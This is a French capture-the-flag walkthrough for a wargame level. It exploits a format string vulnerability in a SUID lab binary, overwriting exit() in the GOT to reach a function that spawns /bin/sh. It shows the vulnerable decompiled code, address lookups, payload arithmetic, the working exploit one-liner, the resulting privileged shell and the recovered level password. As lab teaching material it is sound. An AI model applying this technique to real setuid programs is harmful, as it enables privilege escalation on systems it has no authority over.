# Level5 - Walkthrough

## Objectif
Exploiter une format string vulnerability pour écraser l'adresse de `exit()` dans la GOT et rediriger l'exécution vers `o()` qui lance `/bin/sh`.

**Technique** : GOT Overwrite

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
# ⚠️ Bit SUID actif → s'exécute avec les droits de level6

python -c "print('%x %x %x')" | ./level5
# 200 b7fd1ac0 b7ff37d0
# → Format string vulnerability confirmée
```

### 2. Analyse du code (Ghidra)

```c
void o(void) {
    system("/bin/sh");
    _exit(1);
}

void n(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);  // ⚠️ Vulnérable !
    exit(1);            // ← On va détourner cet appel
}
```

**Stratégie** : Écraser `GOT[exit]` avec l'adresse de `o()`.
Quand `exit(1)` sera appelé → `o()` s'exécutera → `/bin/sh`.

### 3. Trouver les adresses critiques

#### Adresse de `o()`
```bash
# Dans Ghidra → cliquer sur o()
# Adresse : 0x080484a4
```

#### Adresse de `exit()` dans la GOT
```bash
objdump -R level5 | grep exit
# 08049838 R_386_JUMP_SLOT   exit
# Adresse GOT : 0x08049838
```

### 4. Trouver la position du buffer

```bash
python -c "print('AAAA' + '%x.'*10)" | ./level5
# ...41414141...
# → "AAAA" = 0x41414141 en position 4
```

**Notre buffer commence en position 4.**

### 5. Construction du payload

**Conversion 0x080484a4 → décimal** :
```
8×16^6 + 4×16^4 + 8×16^3 + 4×16^2 + 10×16^1 + 4×16^0
= 134217728 + 262144 + 32768 + 1024 + 160 + 4
= 134513828
```

**Calcul du padding** :
```
Valeur à écrire  = 134513828
Adresse affichée = 4 octets
Padding          = 134513828 - 4 = 134513824 → %134513824d
```

**Conversion de l'adresse GOT en little-endian** :
```
0x08049838 → \x38\x98\x04\x08
```

**Structure du payload** :
```
[Adresse GOT exit] + [%134513824d] + [%4$n]
       ↓                   ↓              ↓
\x38\x98\x04\x08   134513824 chars  Écrit 134513828 en position 4
                                    = adresse de o() dans GOT[exit]
```

### 6. Exploitation

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat) | ./level5
```

**Résultat** :
```
$
```

### 7. Vérification
```bash
$ whoami
level6
```

### 8. Récupération du flag

```bash
$ cat /home/user/level6/.pass
d3b7bf1025544a6d95147b7b5b3f36f31f333db3
```

---

## Flag
```
d3b7bf1025544a6d95147b7b5b3f36f31f333db3
```

## Type de vulnérabilité
- Format String Vulnerability (CWE-134)
- GOT Overwrite
- SUID privilege escalation (CWE-250)